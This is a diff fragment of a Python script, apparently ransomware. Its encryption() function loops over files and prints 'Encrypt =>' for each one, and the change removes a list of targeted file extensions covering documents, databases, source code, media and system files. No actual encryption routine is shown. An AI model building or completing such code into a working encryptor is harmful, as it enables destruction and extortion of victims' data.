@@ -83,28 +83,8 @@ def encryption():
 		Check_IMG_Ex = i.split('.')
 		Mrak = Fore.RED+"[-]"+Style.RESET_ALL
 		IMG_EX = Check_IMG_Ex[-1]
-		extensions = [
-		'exe', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES [danger]
-		'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
-	    'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
-	    'yml', 'yaml', 'json', 'xml', 'csv', # structured data
-	    'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images
-	    'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
-	    'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
-	    'java', 'class', 'jar', # java source code
-	    'ps', 'bat', 'vb', # windows based scripts
-	    'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
-	    'go', 'pyc', 'bf', 'coffee', # other source code files
-		'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw','jpeg','webp', # images
-		'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
-		'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp','ts', # Video and movies
-		'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak' 
-		] 
-		if IMG_EX in extensions :
-			print(Mrakp,"Encrypt => {}".format(i))
-		else:
-			print(Mrakp,"Encrypt => {}".format(i))
-
+		
+		print(Mrakp,"Encrypt => {}".format(i))
 
 		System = platform.platform().split("-")[0]
 		if System=="Windows":
